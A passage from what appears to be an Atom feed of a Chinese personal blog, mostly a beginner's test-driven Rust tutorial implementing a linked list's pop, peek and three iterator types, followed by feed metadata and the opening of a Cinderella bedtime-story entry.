    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
            node<span class="token punctuation">.</span>val
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>Option类型的take方法，可以把其中的值取出来。map方法，对取出来的值进行一个闭包形式的操作。这里take出来一个作为参数node，给self重新赋值</p>
<p>以上逻辑看着很理所当然，实际上却没有那么简单。试想如果写成:<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">pop</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>head <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>val<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">None</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>编译器就会提醒self是不可移动的，因为<code>let Some(node) = self.head</code>涉及所有权的转移，而take方法在把值转移出去之后会补充一个None以避免安全问题。</p>
<p>那么，下一个测试要实现peek函数功能，返回头节点的引用：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">peek</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
        <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>as_ref()</code>方法是必须的，因为函数返回了一个内部的引用，这可太危险了，参数出了函数就没了，而引用（指针）还在。</p>
<p>接下来是迭代器，rust中分为三种，移交所有权的，借用型的和可变借用型的。</p>
<p>首先实现转移所有权的into版本，还是先写测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">into_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>取出来的是数值，接下来要实现的有：一个迭代器结构体IntoIter，迭代器特征，以及List结构体的构造迭代器的方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/*……*/</span>
<span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*……*/</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">into_iter</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token class-name">IntoIter</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token comment">/*……*/</span>
<span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">IntoIter</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span> <span class="token class-name">T</span><span class="token punctuation">;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>IntoIter是一个元组结构体，类型是一个List，也就是一个指针</p>
<p>Into的版本在迭代时也把链表清空了，而下一个Iter，返回一个不可变引用，就没有这个问题了，为了展现这一特点，测试写成这样：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>要实现的东西不变，一个结构体定义，一个特征，一个方法<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*List*/</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Iter</span><span class="token punctuation">&#123;</span>
            next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>node<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
<span class="token comment">/*other code*/</span>    

<span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token class-name">T</span><span class="token punctuation">;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>因为涉及到了引用，所以编译器撂挑子了，把生命周期的难题还了回来，不过在此之前，<code>&amp;**node</code>实在是丑陋，其表示对node做两次解引用再返回其引用，可以用<code>as_deref</code>简化：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Iter</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token class-name">Iter</span><span class="token punctuation">&#123;</span>
        next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_deref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>val
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>简洁多了</p>
<p>引用的生命周期要保证引用活得不能比其本体久，在iter函数中就是返回的迭代器活得不长于self，也就是链表头。<br>在迭代器特征的实现中，要保证self至少和Item活得一样久</p>
<p>接下来是更复杂一点的可变借用IterMut，测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> list <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span> val <span class="token keyword">in</span> list<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token operator">*</span>val <span class="token operator">*=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">let</span> <span class="token keyword">mut</span> iter <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>iter<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">pub</span> <span class="token keyword">struct</span> <span class="token type-definition class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token keyword">mut</span> <span class="token class-name">Node</span><span class="token operator">&lt;</span><span class="token class-name">T</span><span class="token operator">>></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//……</span>
    <span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">iter_mut</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'_</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token class-name">IterMut</span><span class="token punctuation">&#123;</span>
            next<span class="token punctuation">:</span> <span class="token keyword">self</span><span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">as_deref_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token comment">//……</span>
<span class="token keyword">impl</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span> <span class="token class-name">Iterator</span> <span class="token keyword">for</span> <span class="token class-name">IterMut</span><span class="token operator">&lt;</span><span class="token lifetime-annotation symbol">'a</span><span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">type</span> <span class="token type-definition class-name">Item</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token lifetime-annotation symbol">'a</span> <span class="token keyword">mut</span> <span class="token class-name">T</span><span class="token punctuation">;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">next</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token keyword">Self</span><span class="token punctuation">::</span><span class="token class-name">Item</span><span class="token operator">></span><span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>node<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">as_deref_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">&amp;</span><span class="token keyword">mut</span> node<span class="token punctuation">.</span>val
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可变引用的难点在于同时只能有一个，是不可copy的，所以在next函数中要使用take()获取值</p>
<p>至此，一个很基本的链表就算是完成了，难怪不建议新手尝试😵‍💫</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;已经学习rust一周了，是时候尝试一下链表了&lt;/p&gt;
&lt;p&gt;按照TDD的规范，先写第一个测试：&lt;br&gt;&lt;pre class=&quot;line-numbers language-rust&quot; data-language=&quot;rust&quot;&gt;&lt;code</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="链表" scheme="https://aucept.in/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>睡前故事：灰姑娘</title>
    <link href="https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/"/>
    <id>https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/</id>
    <published>2025-08-14T14:33:25.000Z</published>
